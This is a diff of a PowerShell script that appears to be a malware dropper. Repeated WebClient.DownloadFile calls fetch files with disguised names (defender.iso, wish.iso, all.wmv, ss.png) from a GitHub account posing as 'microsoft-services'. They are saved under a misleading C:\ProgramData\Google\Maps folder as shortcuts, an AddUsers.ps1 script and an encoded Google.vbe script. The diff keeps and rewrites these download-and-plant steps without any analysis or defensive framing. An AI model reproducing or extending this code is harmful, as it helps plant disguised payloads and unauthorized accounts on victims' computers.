@@ -103,13 +103,15 @@ else{
 
 start-sleep -s 3
 
- $defender = 'C:\ProgramData\Google\Maps\'
+
  
 
  
  powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/defender.iso', 'C:\ProgramData\Google\Maps\Defender.lnk') }"
  start-sleep -s 3
- powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/wish.iso', 'C:\ProgramData\Google\Maps\Wish.lnk') }"
+ # powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/wish.iso', 'C:\ProgramData\Google\Maps\Wish.lnk') }"
+
+if((New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/wish.iso', 'C:\ProgramData\Google\Maps\Wish.lnk')){}
   start-sleep -s 3
   
   powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/maps.iso', 'C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk') }"
@@ -134,17 +136,8 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.gi
 
 
 
-if((New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/all.wmv', $defender + 'AddUsers.ps1')){
-}
-
- $def = 'C:\ProgramData\Google\Maps\'
-
-
-
-
-
-if((New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/ss.png', $def + 'Google.vbe')){
-}
+if((New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/all.wmv', 'C:\ProgramData\Google\Maps\AddUsers.ps1')){}
+if((New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/microsoft-services/staff/settings/ss.png', 'C:\ProgramData\Google\Maps\Google.vbe')){}
 
 
 
